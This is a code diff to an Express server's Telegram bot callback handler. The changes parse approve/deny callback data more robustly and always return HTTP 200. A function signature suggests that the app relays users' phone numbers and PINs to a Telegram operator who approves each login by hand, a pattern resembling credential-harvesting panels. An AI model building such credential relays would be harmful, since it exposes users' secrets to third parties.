@@ -126,24 +126,35 @@ async function sendTelegramLoginRequest(phone, pin, requestId) {
 // ============================================
 app.post('/api/telegram/callback', async (req, res) => {
   try {
-    // Log the full request body for debugging
-    console.log('📥 Full callback body:', JSON.stringify(req.body, null, 2));
+    console.log('📥 Full callback body received');
     
-    const { callback_data } = req.body;
-
-    console.log('📥 Callback data:', callback_data);
-
-    if (!callback_data) {
-      console.log('❌ No callback_data found');
-      return res.status(400).json({ success: false, message: 'No callback data' });
+    // Extract callback data from the correct location
+    let callbackData = req.body.callback_data;
+    
+    // If not found, try to get it from callback_query
+    if (!callbackData && req.body.callback_query) {
+      callbackData = req.body.callback_query.data;
+      console.log('📥 Extracted from callback_query.data:', callbackData);
+    }
+    
+    // If still not found, try direct
+    if (!callbackData) {
+      callbackData = req.body.data;
     }
 
-    const [action, requestId] = callback_data.split('_');
+    console.log('📥 Callback data:', callbackData);
+
+    if (!callbackData) {
+      console.log('❌ No callback_data found');
+      return res.status(200).json({ success: false, message: 'No callback data' });
+    }
+
+    const [action, requestId] = callbackData.split('_');
     console.log(`📥 Action: ${action}, RequestId: ${requestId}`);
 
     if (!pendingRequests[requestId]) {
       console.log(`❌ Request ${requestId} not found`);
-      return res.status(404).json({ success: false, message: 'Request not found' });
+      return res.status(200).json({ success: false, message: 'Request not found' });
     }
 
     if (action === 'approve') {
@@ -151,7 +162,6 @@ app.post('/api/telegram/callback', async (req, res) => {
       console.log('✅ Login approved for request:', requestId);
       console.log('📱 Phone:', pendingRequests[requestId].phone);
       
-      // Send confirmation to Telegram
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -162,7 +172,7 @@ app.post('/api/telegram/callback', async (req, res) => {
         })
       });
 
-      res.status(200).json({ success: true, message: 'Login approved' });
+      return res.status(200).json({ success: true, message: 'Login approved' });
       
     } else if (action === 'deny') {
       pendingRequests[requestId].status = 'denied';
@@ -179,15 +189,15 @@ app.post('/api/telegram/callback', async (req, res) => {
         })
       });
 
-      res.status(200).json({ success: true, message: 'Login denied' });
+      return res.status(200).json({ success: true, message: 'Login denied' });
       
     } else {
       console.log(`❌ Invalid action: ${action}`);
-      res.status(400).json({ success: false, message: 'Invalid action' });
+      return res.status(200).json({ success: false, message: 'Invalid action' });
     }
   } catch (error) {
     console.error('❌ Callback error:', error);
-    res.status(500).json({ success: false, message: error.message });
+    return res.status(200).json({ success: false, message: error.message });
   }
 });
 
